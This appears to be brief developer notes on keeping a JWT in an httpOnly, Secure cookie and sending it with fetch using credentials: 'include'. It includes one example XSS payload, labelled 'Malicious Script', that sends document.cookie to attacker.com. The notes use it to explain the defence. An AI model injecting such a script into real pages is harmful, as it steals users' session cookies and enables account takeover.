Set-Cookie: jwt=eyJhbGciOi...; httpOnly; Secure;


// Malicious Script
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>


FB <--> Client
fetch("/api/user", {
  method: "GET",
  credentials: "include", 
});

Access it on the server